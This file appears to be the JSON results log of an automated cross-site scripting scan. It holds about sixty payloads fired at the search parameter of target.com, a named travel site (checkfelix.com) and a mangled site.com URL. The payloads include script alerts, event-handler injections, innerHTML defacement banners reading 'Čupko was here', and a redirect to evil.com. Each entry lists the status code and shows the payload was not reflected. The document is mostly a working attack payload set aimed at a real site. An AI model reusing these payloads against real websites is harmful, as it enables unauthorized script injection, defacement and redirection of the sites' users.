@@ -1,0 +1,506 @@
+[
+  {
+    "url": "https://target.com/search?q=<script>alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")</script>",
+    "payload": "<script>alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")</script>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:11.546013"
+  },
+  {
+    "url": "https://target.com/search?q=<h1>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>",
+    "payload": "<h1>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 2281,
+    "timestamp": "2025-05-25T19:20:12.755045"
+  },
+  {
+    "url": "https://target.com/search?q=<img src=x onerror=\"alert('\u010cupko was here \u2013 H1: Whitefox980 Team')\">",
+    "payload": "<img src=x onerror=\"alert('\u010cupko was here \u2013 H1: Whitefox980 Team')\">",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:13.487631"
+  },
+  {
+    "url": "https://target.com/search?q=<svg onload=alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")>",
+    "payload": "<svg onload=alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:14.399808"
+  },
+  {
+    "url": "https://target.com/search?q=\"><script>document.body.innerHTML+='<div style=position:fixed;top:0;left:0;width:100%;background:#000;color:#0f0;text-align:center;font-size:18px;z-index:9999>\u010cupko was here<br><b>H1: Whitefox980 Team</b></div>'</script>",
+    "payload": "\"><script>document.body.innerHTML+='<div style=position:fixed;top:0;left:0;width:100%;background:#000;color:#0f0;text-align:center;font-size:18px;z-index:9999>\u010cupko was here<br><b>H1: Whitefox980 Team</b></div>'</script>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:15.432584"
+  },
+  {
+    "url": "https://target.com/search?q=<iframe srcdoc=\"<h1>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>\">",
+    "payload": "<iframe srcdoc=\"<h1>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>\">",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:16.332670"
+  },
+  {
+    "url": "https://target.com/search?q=<math><mtext><img src=x onerror=alert('\u010cupko was here \u2013 H1: Whitefox980 Team')></mtext></math>",
+    "payload": "<math><mtext><img src=x onerror=alert('\u010cupko was here \u2013 H1: Whitefox980 Team')></mtext></math>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:17.192671"
+  },
+  {
+    "url": "https://target.com/search?q=<body onload=alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")>",
+    "payload": "<body onload=alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:18.150567"
+  },
+  {
+    "url": "https://target.com/search?q=\"><h1 style=color:lime;background:black;padding:5px>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>",
+    "payload": "\"><h1 style=color:lime;background:black;padding:5px>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 2281,
+    "timestamp": "2025-05-25T19:20:20.068592"
+  },
+  {
+    "url": "https://target.com/search?q=\"><img src=x onerror=document.body.innerHTML+=\"<h1 style='color:lime'>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>\">",
+    "payload": "\"><img src=x onerror=document.body.innerHTML+=\"<h1 style='color:lime'>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>\">",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:20.918354"
+  },
+  {
+    "url": "https://target.com/search?q=<!--\u010cupko was here \u2013 H1: Whitefox980 Team-->",
+    "payload": "<!--\u010cupko was here \u2013 H1: Whitefox980 Team-->",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 2281,
+    "timestamp": "2025-05-25T19:20:21.793425"
+  },
+  {
+    "url": "https://target.com/search?q=\"><script>location='https://evil.com?who=Chupko+was+here+-+Whitefox980+Team'</script>",
+    "payload": "\"><script>location='https://evil.com?who=Chupko+was+here+-+Whitefox980+Team'</script>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:23.271093"
+  },
+  {
+    "url": "https://target.com/search?q=<details open ontoggle=alert(\"\u010cupko was here \u2013 Whitefox980 Team\")>",
+    "payload": "<details open ontoggle=alert(\"\u010cupko was here \u2013 Whitefox980 Team\")>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:25.430993"
+  },
+  {
+    "url": "https://target.com/search?q=<marquee><h1>\u010cupko was here \u2013 Whitefox980 Team</h1></marquee>",
+    "payload": "<marquee><h1>\u010cupko was here \u2013 Whitefox980 Team</h1></marquee>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 2281,
+    "timestamp": "2025-05-25T19:20:26.796764"
+  },
+  {
+    "url": "https://target.com/search?q=<input autofocus onfocus=alert(\"\u010cupko was here \u2013 Whitefox980 Team\")>",
+    "payload": "<input autofocus onfocus=alert(\"\u010cupko was here \u2013 Whitefox980 Team\")>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:27.969218"
+  },
+  {
+    "url": "https://target.com/search?q=<video><source onerror=\"alert('\u010cupko was here \u2013 Whitefox980 Team')\">",
+    "payload": "<video><source onerror=\"alert('\u010cupko was here \u2013 Whitefox980 Team')\">",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:29.032743"
+  },
+  {
+    "url": "https://target.com/search?q=<iframe srcdoc=\"<script>alert('\u010cupko was here \u2013 Whitefox980 Team')</script>\">",
+    "payload": "<iframe srcdoc=\"<script>alert('\u010cupko was here \u2013 Whitefox980 Team')</script>\">",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:30.153293"
+  },
+  {
+    "url": "https://target.com/search?q=<math href=\"javascript:alert('\u010cupko was here \u2013 Whitefox980 Team')\">CLICK</math>",
+    "payload": "<math href=\"javascript:alert('\u010cupko was here \u2013 Whitefox980 Team')\">CLICK</math>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:31.200777"
+  },
+  {
+    "url": "https://target.com/search?q=<isindex type=image src=1 onerror=alert('\u010cupko was here \u2013 Whitefox980 Team')>",
+    "payload": "<isindex type=image src=1 onerror=alert('\u010cupko was here \u2013 Whitefox980 Team')>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:32.486089"
+  },
+  {
+    "url": "https://target.com/search?q=<script>console.log('\u010cupko was here \u2013 Whitefox980 Team')</script>",
+    "payload": "<script>console.log('\u010cupko was here \u2013 Whitefox980 Team')</script>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:33.312994"
+  },
+  {
+    "url": "https://target.com/search?q=<a href=\"javascript:alert('\u010cupko was here \u2013 Whitefox980 Team')\">Proof</a>",
+    "payload": "<a href=\"javascript:alert('\u010cupko was here \u2013 Whitefox980 Team')\">Proof</a>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:20:35.022522"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<script>alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")</script>",
+    "payload": "<script>alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")</script>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:07.217779"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<h1>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>",
+    "payload": "<h1>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 205492,
+    "timestamp": "2025-05-25T19:34:08.437012"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<img src=x onerror=\"alert('\u010cupko was here \u2013 H1: Whitefox980 Team')\">",
+    "payload": "<img src=x onerror=\"alert('\u010cupko was here \u2013 H1: Whitefox980 Team')\">",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:09.072303"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<svg onload=alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")>",
+    "payload": "<svg onload=alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:09.626957"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=\"><script>document.body.innerHTML+='<div style=position:fixed;top:0;left:0;width:100%;background:#000;color:#0f0;text-align:center;font-size:18px;z-index:9999>\u010cupko was here<br><b>H1: Whitefox980 Team</b></div>'</script>",
+    "payload": "\"><script>document.body.innerHTML+='<div style=position:fixed;top:0;left:0;width:100%;background:#000;color:#0f0;text-align:center;font-size:18px;z-index:9999>\u010cupko was here<br><b>H1: Whitefox980 Team</b></div>'</script>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:10.264775"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<iframe srcdoc=\"<h1>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>\">",
+    "payload": "<iframe srcdoc=\"<h1>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>\">",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:11.661957"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<math><mtext><img src=x onerror=alert('\u010cupko was here \u2013 H1: Whitefox980 Team')></mtext></math>",
+    "payload": "<math><mtext><img src=x onerror=alert('\u010cupko was here \u2013 H1: Whitefox980 Team')></mtext></math>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:12.232998"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<body onload=alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")>",
+    "payload": "<body onload=alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:12.812412"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=\"><h1 style=color:lime;background:black;padding:5px>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>",
+    "payload": "\"><h1 style=color:lime;background:black;padding:5px>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 205492,
+    "timestamp": "2025-05-25T19:34:13.688123"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=\"><img src=x onerror=document.body.innerHTML+=\"<h1 style='color:lime'>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>\">",
+    "payload": "\"><img src=x onerror=document.body.innerHTML+=\"<h1 style='color:lime'>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>\">",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:14.267553"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<!--\u010cupko was here \u2013 H1: Whitefox980 Team-->",
+    "payload": "<!--\u010cupko was here \u2013 H1: Whitefox980 Team-->",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 205492,
+    "timestamp": "2025-05-25T19:34:15.280252"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=\"><script>location='https://evil.com?who=Chupko+was+here+-+Whitefox980+Team'</script>",
+    "payload": "\"><script>location='https://evil.com?who=Chupko+was+here+-+Whitefox980+Team'</script>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:15.726100"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<details open ontoggle=alert(\"\u010cupko was here \u2013 Whitefox980 Team\")>",
+    "payload": "<details open ontoggle=alert(\"\u010cupko was here \u2013 Whitefox980 Team\")>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:16.815485"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<marquee><h1>\u010cupko was here \u2013 Whitefox980 Team</h1></marquee>",
+    "payload": "<marquee><h1>\u010cupko was here \u2013 Whitefox980 Team</h1></marquee>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 205492,
+    "timestamp": "2025-05-25T19:34:18.121991"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<input autofocus onfocus=alert(\"\u010cupko was here \u2013 Whitefox980 Team\")>",
+    "payload": "<input autofocus onfocus=alert(\"\u010cupko was here \u2013 Whitefox980 Team\")>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:18.572922"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<video><source onerror=\"alert('\u010cupko was here \u2013 Whitefox980 Team')\">",
+    "payload": "<video><source onerror=\"alert('\u010cupko was here \u2013 Whitefox980 Team')\">",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:19.129213"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<iframe srcdoc=\"<script>alert('\u010cupko was here \u2013 Whitefox980 Team')</script>\">",
+    "payload": "<iframe srcdoc=\"<script>alert('\u010cupko was here \u2013 Whitefox980 Team')</script>\">",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:19.880813"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<math href=\"javascript:alert('\u010cupko was here \u2013 Whitefox980 Team')\">CLICK</math>",
+    "payload": "<math href=\"javascript:alert('\u010cupko was here \u2013 Whitefox980 Team')\">CLICK</math>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:20.463875"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<isindex type=image src=1 onerror=alert('\u010cupko was here \u2013 Whitefox980 Team')>",
+    "payload": "<isindex type=image src=1 onerror=alert('\u010cupko was here \u2013 Whitefox980 Team')>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:21.266267"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<script>console.log('\u010cupko was here \u2013 Whitefox980 Team')</script>",
+    "payload": "<script>console.log('\u010cupko was here \u2013 Whitefox980 Team')</script>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:21.817728"
+  },
+  {
+    "url": "https://www.checkfelix.com/search?q=<a href=\"javascript:alert('\u010cupko was here \u2013 Whitefox980 Team')\">Proof</a>",
+    "payload": "<a href=\"javascript:alert('\u010cupko was here \u2013 Whitefox980 Team')\">Proof</a>",
+    "reflected": false,
+    "status_code": 406,
+    "response_size": 0,
+    "timestamp": "2025-05-25T19:34:22.297372"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<script>alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")</script>",
+    "payload": "<script>alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")</script>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:16.862401"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<h1>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>",
+    "payload": "<h1>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:17.385253"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<img src=x onerror=\"alert('\u010cupko was here \u2013 H1: Whitefox980 Team')\">",
+    "payload": "<img src=x onerror=\"alert('\u010cupko was here \u2013 H1: Whitefox980 Team')\">",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:19.758176"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<svg onload=alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")>",
+    "payload": "<svg onload=alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:21.338488"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=\"><script>document.body.innerHTML+='<div style=position:fixed;top:0;left:0;width:100%;background:#000;color:#0f0;text-align:center;font-size:18px;z-index:9999>\u010cupko was here<br><b>H1: Whitefox980 Team</b></div>'</script>",
+    "payload": "\"><script>document.body.innerHTML+='<div style=position:fixed;top:0;left:0;width:100%;background:#000;color:#0f0;text-align:center;font-size:18px;z-index:9999>\u010cupko was here<br><b>H1: Whitefox980 Team</b></div>'</script>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:22.629307"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<iframe srcdoc=\"<h1>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>\">",
+    "payload": "<iframe srcdoc=\"<h1>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>\">",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:23.967948"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<math><mtext><img src=x onerror=alert('\u010cupko was here \u2013 H1: Whitefox980 Team')></mtext></math>",
+    "payload": "<math><mtext><img src=x onerror=alert('\u010cupko was here \u2013 H1: Whitefox980 Team')></mtext></math>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:25.556427"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<body onload=alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")>",
+    "payload": "<body onload=alert(\"\u010cupko was here \u2013 H1: Whitefox980 Team\")>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:26.494928"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=\"><h1 style=color:lime;background:black;padding:5px>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>",
+    "payload": "\"><h1 style=color:lime;background:black;padding:5px>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:27.363115"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=\"><img src=x onerror=document.body.innerHTML+=\"<h1 style='color:lime'>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>\">",
+    "payload": "\"><img src=x onerror=document.body.innerHTML+=\"<h1 style='color:lime'>\u010cupko was here \u2013 H1: Whitefox980 Team</h1>\">",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:28.706243"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<!--\u010cupko was here \u2013 H1: Whitefox980 Team-->",
+    "payload": "<!--\u010cupko was here \u2013 H1: Whitefox980 Team-->",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:30.636590"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=\"><script>location='https://evil.com?who=Chupko+was+here+-+Whitefox980+Team'</script>",
+    "payload": "\"><script>location='https://evil.com?who=Chupko+was+here+-+Whitefox980+Team'</script>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:31.434067"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<details open ontoggle=alert(\"\u010cupko was here \u2013 Whitefox980 Team\")>",
+    "payload": "<details open ontoggle=alert(\"\u010cupko was here \u2013 Whitefox980 Team\")>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:31.936858"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<marquee><h1>\u010cupko was here \u2013 Whitefox980 Team</h1></marquee>",
+    "payload": "<marquee><h1>\u010cupko was here \u2013 Whitefox980 Team</h1></marquee>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:32.904134"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<input autofocus onfocus=alert(\"\u010cupko was here \u2013 Whitefox980 Team\")>",
+    "payload": "<input autofocus onfocus=alert(\"\u010cupko was here \u2013 Whitefox980 Team\")>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:34.672300"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<video><source onerror=\"alert('\u010cupko was here \u2013 Whitefox980 Team')\">",
+    "payload": "<video><source onerror=\"alert('\u010cupko was here \u2013 Whitefox980 Team')\">",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:36.387577"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<iframe srcdoc=\"<script>alert('\u010cupko was here \u2013 Whitefox980 Team')</script>\">",
+    "payload": "<iframe srcdoc=\"<script>alert('\u010cupko was here \u2013 Whitefox980 Team')</script>\">",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:36.948324"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<math href=\"javascript:alert('\u010cupko was here \u2013 Whitefox980 Team')\">CLICK</math>",
+    "payload": "<math href=\"javascript:alert('\u010cupko was here \u2013 Whitefox980 Team')\">CLICK</math>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:37.476308"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<isindex type=image src=1 onerror=alert('\u010cupko was here \u2013 Whitefox980 Team')>",
+    "payload": "<isindex type=image src=1 onerror=alert('\u010cupko was here \u2013 Whitefox980 Team')>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:39.593017"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<script>console.log('\u010cupko was here \u2013 Whitefox980 Team')</script>",
+    "payload": "<script>console.log('\u010cupko was here \u2013 Whitefox980 Team')</script>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:41.509324"
+  },
+  {
+    "url": "https://site.com/search?q=): https://www.checkfelix.com/search?q=<a href=\"javascript:alert('\u010cupko was here \u2013 Whitefox980 Team')\">Proof</a>",
+    "payload": "<a href=\"javascript:alert('\u010cupko was here \u2013 Whitefox980 Team')\">Proof</a>",
+    "reflected": false,
+    "status_code": 404,
+    "response_size": 576,
+    "timestamp": "2025-05-25T20:10:43.344755"
+  }
+]
